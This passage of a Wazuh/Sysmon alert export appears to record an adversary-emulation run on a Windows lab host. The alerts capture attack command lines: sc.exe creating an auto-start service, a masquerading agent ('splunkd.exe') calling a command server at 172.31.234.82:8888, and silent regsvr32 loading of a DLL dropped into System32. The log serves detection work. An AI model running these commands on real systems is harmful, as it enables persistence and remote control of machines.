@\""C:\\Users\\mari\\AppData\\Local\\Temp\\deuz0lq2\\deuz0lq2.cmdline\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,DvrYe5MBRlc-D5DF6R7W,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1543.003,technique_name=Windows Service
UtcTime: 2024-11-30 06:53:47.710
ProcessGuid: {15959494-B67B-674A-D605-000000000D00}
ProcessId: 6856
Image: C:\Windows\System32\sc.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Service Control Manager Configuration Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: sc.exe
CommandLine: sc.exe  \\localhost create AtomicTestService_CMD binPath= ""411da5_AtomicService.exe"" start=auto type=Own 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=72785E3068AA52CA223DA466595D3863AB6507AB,MD5=D79784553A9410D15E04766AAAB77CD6,SHA256=AEB241959F4A7B7C29F45D27FD65C5326F9592D25BADD1A7659DE0DA351BF96E,IMPHASH=7D296975925315BE8D57D0C67B133359
ParentProcessGuid: {15959494-B67B-674A-D505-000000000D00}
ParentProcessId: 388
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C sc.exe \\localhost create AtomicTestService_CMD binPath= ""411da5_AtomicService.exe"" start=auto type=Own && sc.exe \\localhost start AtomicTestService_CMD
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:53:47.711498000Z,54541,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,10,false,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:53:48.806",EventChannel,1732949628.993289,"Nov 30, 2024 @ 06:53:48.806", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,6856, , , , , , , , , , ,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , ,sc.exe,C:\\Windows\\System32\\sc.exe,Microsoft® Windows® Operating System, , ,Service Control Manager Configuration Tool, , ,{15959494-B67B-674A-D605-000000000D00},2024-11-30 06:53:47.710,"SHA1=72785E3068AA52CA223DA466595D3863AB6507AB,MD5=D79784553A9410D15E04766AAAB77CD6,SHA256=AEB241959F4A7B7C29F45D27FD65C5326F9592D25BADD1A7659DE0DA351BF96E,IMPHASH=7D296975925315BE8D57D0C67B133359","technique_id=T1543.003,technique_name=Windows Service",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-B67B-674A-D505-000000000D00},"cmd.exe /C sc.exe \\\\localhost create AtomicTestService_CMD binPath= \""411da5_AtomicService.exe\"" start=auto type=Own &amp;&amp; sc.exe \\\\localhost start AtomicTestService_CMD",0x107a6b,388,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,"sc.exe  \\\\localhost create AtomicTestService_CMD binPath= \""411da5_AtomicService.exe\"" start=auto type=Own",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,Ffrae5MBRlc-D5DFSR5t,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1027,technique_name=Obfuscated Files or Information
UtcTime: 2024-11-30 06:55:17.781
ProcessGuid: {15959494-B6D5-674A-DB05-000000000D00}
ProcessId: 3204
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
FileVersion: 131.0.6778.86
Description: Google Chrome
Product: Google Chrome
Company: Google LLC
OriginalFileName: chrome.exe
CommandLine: ""C:\Program Files\Google\Chrome\Application\chrome.exe""  --headless --disable-gpu https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=A49EE5B70DB431702B8AC8DF35485B2C1DF79DA3,MD5=D464B92858EA2F26061EEA64BF7A0390,SHA256=A2B6DE8932FC0D057F34415F96244906A70EEDB3C169B9A83B3050179065AD1B,IMPHASH=5D59E18B03E66F630296FC0E9CF014A5
ParentProcessGuid: {15959494-B6D5-674A-DA05-000000000D00}
ParentProcessId: 8176
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C start """" chrome --headless --disable-gpu https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:55:17.801110300Z,54569,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,11,false,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:55:20.298",EventChannel,1732949720.1012799,"Nov 30, 2024 @ 06:55:20.298", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,3204, , , , , , , , , , ,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , ,chrome.exe,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe,Google Chrome, , ,Google Chrome, , ,{15959494-B6D5-674A-DB05-000000000D00},2024-11-30 06:55:17.781,"SHA1=A49EE5B70DB431702B8AC8DF35485B2C1DF79DA3,MD5=D464B92858EA2F26061EEA64BF7A0390,SHA256=A2B6DE8932FC0D057F34415F96244906A70EEDB3C169B9A83B3050179065AD1B,IMPHASH=5D59E18B03E66F630296FC0E9CF014A5","technique_id=T1027,technique_name=Obfuscated Files or Information",Google LLC,131.0.6778.86,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-B6D5-674A-DA05-000000000D00},"cmd.exe /C start \""\"" chrome --headless --disable-gpu https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec",0x107a6b,8176,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,"\""C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\""  --headless --disable-gpu https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,Jvrbe5MBRlc-D5DFRx5Z,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 06:56:19.827
ProcessGuid: {15959494-B713-674A-1206-000000000D00}
ProcessId: 7800
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_qeehkhv0.zoa.ps1
CreationUtcTime: 2024-11-30 06:56:19.827
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:56:19.838084900Z,54761,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,39,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:56:20.940",EventChannel,1732949780.1072058,"Nov 30, 2024 @ 06:56:20.940", , , , , , , , , , , , ,7800, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-B713-674A-1206-000000000D00},2024-11-30 06:56:19.827, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_qeehkhv0.zoa.ps1,2024-11-30 06:56:19.827, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,J_rbe5MBRlc-D5DFRx5Z,1,1,192.168.117.134,window-agent3,003,Maryam, ,7040,Service Control Manager,0x8080000000000000,{555908d1-a6d7-4695-8e1e-26931d2012f4},4,System,0,"""The start type of the Background Intelligent Transfer Service service was changed from demand start to auto start.""",0,2024-11-30T06:56:22.898137400Z,2058,7260,DESKTOP-QGB4EQH,0,592,INFORMATION,Service Control Manager,1,false,3,Service startup type was changed,"[""windows"",""windows_system"",""policy_changed""]",61104,"[""IV_35.7.d""]", ,windows_eventchannel,log,"Nov 30, 2024 @ 06:56:23.961",EventChannel,1732949783.1075069,"Nov 30, 2024 @ 06:56:23.961", , , , , , , , , , , , , , , , , , , ,"[""164.312.b""]","[""10.6""]","[""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]","[""AU.6""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,Background Intelligent Transfer Service,demand start, , ,auto start,BITS,This does not appear to be logged on Windows 2000, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,Hfrae5MBRlc-D5DF5R6u,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-11-30 06:56:00.208
ProcessGuid: {15959494-B6D5-674A-DB05-000000000D00}
ProcessId: 3204
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\scoped_dir3204_2005692577\CRX_INSTALL\assets\libs\axios.min.js
CreationUtcTime: 2024-11-30 06:56:00.208
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:56:00.218829100Z,54724,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,31,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:56:00.655",EventChannel,1732949760.1041042,"Nov 30, 2024 @ 06:56:00.655", , , , , , , , , , , , ,3204, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, , , , , , ,{15959494-B6D5-674A-DB05-000000000D00},2024-11-30 06:56:00.208, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\scoped_dir3204_2005692577\\CRX_INSTALL\\assets\\libs\\axios.min.js,2024-11-30 06:56:00.208, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,Ifrae5MBRlc-D5DF5R6u,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-11-30 06:56:00.255
ProcessGuid: {15959494-B6D5-674A-DB05-000000000D00}
ProcessId: 3204
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\scoped_dir3204_2005692577\CRX_INSTALL\polyfills.js
CreationUtcTime: 2024-11-30 06:56:00.255
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:56:00.269585400Z,54729,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,35,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:56:00.717",EventChannel,1732949760.1053308,"Nov 30, 2024 @ 06:56:00.717", , , , , , , , , , , , ,3204, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, , , , , , ,{15959494-B6D5-674A-DB05-000000000D00},2024-11-30 06:56:00.255, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\scoped_dir3204_2005692577\\CRX_INSTALL\\polyfills.js,2024-11-30 06:56:00.255, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,F_rae5MBRlc-D5DFqx4U,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-11-30 06:55:41.442
ProcessGuid: {15959494-B6D5-674A-DB05-000000000D00}
ProcessId: 3204
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\scoped_dir3204_472693983\CRX_INSTALL\popup.bundle.js
CreationUtcTime: 2024-11-30 06:55:41.442
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:55:41.450088200Z,54702,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,25,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:55:42.311",EventChannel,1732949742.1022456,"Nov 30, 2024 @ 06:55:42.311", , , , , , , , , , , , ,3204, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, , , , , , ,{15959494-B6D5-674A-DB05-000000000D00},2024-11-30 06:55:41.442, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\scoped_dir3204_472693983\\CRX_INSTALL\\popup.bundle.js,2024-11-30 06:55:41.442, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,K_rde5MBRlc-D5DFLx6m,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: -
UtcTime: 2024-11-30 06:58:29.672
ProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ProcessId: 7968
Image: C:\Users\Public\splunkd.exe
TargetFilename: C:\Windows\System32\67baa5_GUP.exe
CreationUtcTime: 2024-11-30 06:58:29.672
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:58:29.673006500Z,54813,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,6,Executable dropped in Windows root folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92217, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:58:30.736",EventChannel,1732949910.1092892,"Nov 30, 2024 @ 06:58:30.736", , , , , , , , , , , , ,7968, , , , , , , , , , ,"[""Lateral Tool Transfer""]","[""T1570""]","[""Lateral Movement""]", , , , ,C:\\Users\\Public\\splunkd.exe, , , , , , ,{15959494-D565-6749-1C01-000000000D00},2024-11-30 06:58:29.672, , , , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Windows\\System32\\67baa5_GUP.exe,2024-11-30 06:58:29.672, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,O_rie5MBRlc-D5DFER62,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1574.010,technique_name=Services File Permissions Weakness
UtcTime: 2024-11-30 07:03:41.510
ProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ProcessId: 7968
Image: C:\Users\Public\splunkd.exe
TargetFilename: C:\Windows\System32\bafdf3_AllTheThingsx86.dll
CreationUtcTime: 2024-11-30 07:03:41.509
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T07:03:41.510782900Z,54867,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,3,false,6,Executable dropped in Windows root folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92217, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:03:42.576",EventChannel,1732950222.1152246,"Nov 30, 2024 @ 07:03:42.576", , , , , , , , , , , , ,7968, , , , , , , , , , ,"[""Lateral Tool Transfer""]","[""T1570""]","[""Lateral Movement""]", , , , ,C:\\Users\\Public\\splunkd.exe, , , , , , ,{15959494-D565-6749-1C01-000000000D00},2024-11-30 07:03:41.510, ,"technique_id=T1574.010,technique_name=Services File Permissions Weakness", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Windows\\System32\\bafdf3_AllTheThingsx86.dll,2024-11-30 07:03:41.509, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,PPrie5MBRlc-D5DFER62,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-11-30 07:03:41.513
ProcessGuid: {15959494-B8CD-674A-2806-000000000D00}
ProcessId: 7972
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C IF ""%%PROCESSOR_ARCHITECTURE%%""==""AMD64"" (C:\Windows\syswow64\regsvr32.exe /s bafdf3_AllTheThingsx86.dll) ELSE ( C:\Windows\system32\regsvr32.exe /s bafdf3_AllTheThingsx86.dll )
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:03:41.515602100Z,54869,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,15,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:03:42.587",EventChannel,1732950222.1155088,"Nov 30, 2024 @ 07:03:42.587", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,7972, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-B8CD-674A-2806-000000000D00},2024-11-30 07:03:41.513,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C IF \""%%PROCESSOR_ARCHITECTURE%%\""==\""AMD64\"" (C:\\Windows\\syswow64\\regsvr32.exe /s bafdf3_AllTheThingsx86.dll) ELSE ( C:\\Windows\\system32\\regsvr32.exe /s bafdf3_AllTheThingsx86.dll )",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,Pfrie5MBRlc-D5DFER62,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1218.010,technique_name=Regsvr32
UtcTime: 2024-11-30 07:03:41.523
ProcessGuid: {15959494-B8CD-674A-2906-000000000D00}
ProcessId: 1972
Image: C:\Windows\SysWOW64\regsvr32.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\syswow64\regsvr32.exe  /s bafdf3_AllTheThingsx86.dll
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=88630F60E73454670A7D9B64C98B4798D1DE8872,MD5=426E7499F6A7346F0410DEAD0805586B,SHA256=4DC13CBE6F048809D49B0095B1691104E5A64ECA6BCC2A6243C074CB91D038E9,IMPHASH=99BBF1337F3DA5CFAB67854DF4ADE1D8
ParentProcessGuid: {15959494-B8CD-674A-2806-000000000D00}
ParentProcessId: 7972
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C IF ""%PROCESSOR_ARCHITECTURE%""==""AMD64"" (C:\Windows\syswow64\regsvr32.exe /s bafdf3_AllTheThingsx86.dll) ELSE ( C:\Windows\system32\regsvr32.exe /s bafdf3_AllTheThingsx86.dll )
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:03:41.524285700Z,54871,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,14,false,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:03:42.635",EventChannel,1732950222.1161881,"Nov 30, 2024 @ 07:03:42.635", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,1972, , , , , , , , , , ,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , ,REGSVR32.EXE,C:\\Windows\\SysWOW64\\regsvr32.exe,Microsoft® Windows® Operating System, , ,Microsoft(C) Register Server, , ,{15959494-B8CD-674A-2906-000000000D00},2024-11-30 07:03:41.523,"SHA1=88630F60E73454670A7D9B64C98B4798D1DE8872,MD5=426E7499F6A7346F0410DEAD0805586B,SHA256=4DC13CBE6F048809D49B0095B1691104E5A64ECA6BCC2A6243C074CB91D038E9,IMPHASH=99BBF1337F3DA5CFAB67854DF4ADE1D8","technique_id=T1218.010,technique_name=Regsvr32",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-B8CD-674A-2806-000000000D00},"cmd.exe /C IF \""%PROCESSOR_ARCHITECTURE%\""==\""AMD64\"" (C:\\Windows\\syswow64\\regsvr32.exe /s bafdf3_AllTheThingsx86.dll) ELSE ( C:\\Windows\\system32\\regsvr32.exe /s bafdf3_AllTheThingsx86.dll )",0x107a6b,7972,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,C:\\Windows\\syswow64\\regsvr32.exe  /s bafdf3_AllTheThingsx86.dll,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
